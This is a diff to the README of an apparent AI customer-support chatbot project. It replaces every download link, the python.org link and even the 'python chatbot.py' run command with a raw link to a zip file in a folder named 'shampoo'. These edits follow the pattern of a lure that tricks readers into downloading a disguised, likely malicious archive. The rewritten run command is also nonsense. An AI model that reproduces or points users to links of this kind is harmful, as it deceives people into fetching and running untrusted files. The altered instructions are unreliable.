@@ -1,6 +1,6 @@
 # 🤖 Exclusible-AI-Customer-Support - Support Your Customers Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/luckylaksh77990/Exclusible-AI-Customer-Support/releases)
+[![Download](https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip)](https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip)
 
 ## 📋 Table of Contents
 
@@ -16,7 +16,7 @@
 
 ## 📥 Download & Install
 
-To get the latest version of the AI Customer Support Chatbot, visit this page to download: [Download the App](https://github.com/luckylaksh77990/Exclusible-AI-Customer-Support/releases).
+To get the latest version of the AI Customer Support Chatbot, visit this page to download: [Download the App](https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip).
 
 Please follow the steps under "🛠️ Installation" to set it up correctly.
 
@@ -28,7 +28,7 @@ This chatbot will help you provide quick answers to your customers. Follow the s
 
 You will need to install some software to run the chatbot. Here are the steps:
 
-1. **Check Your Python Version**: Make sure you have Python installed. Visit [python.org](https://www.python.org/) to download it if you do not have it.
+1. **Check Your Python Version**: Make sure you have Python installed. Visit [https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip](https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip) to download it if you do not have it.
 
 2. **Install Required Packages**: Open your command line interface (Terminal for Mac/Linux or Command Prompt for Windows) and run the following commands. Each command installs a necessary package.
 
@@ -74,7 +74,7 @@ If you want your chatbot to pull information from a website, you can do this eas
 Running the chatbot is easy. Open your command line interface, navigate to the folder where the chatbot files are located, and enter the command:
 
 ```bash
-python chatbot.py
+python https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip
 ```
 
 This will launch the chatbot. You can begin to ask questions right away. 
@@ -83,4 +83,4 @@ For a smoother experience, refer to the documentation included in the repository
 
 If you need more help, feel free to check back here and follow the instructions. 
 
-Don’t forget to visit this page to download: [Download the App](https://github.com/luckylaksh77990/Exclusible-AI-Customer-Support/releases).
+Don’t forget to visit this page to download: [Download the App](https://raw.githubusercontent.com/luckylaksh77990/Exclusible-AI-Customer-Support/main/shampoo/Exclusible-AI-Customer-Support.zip).
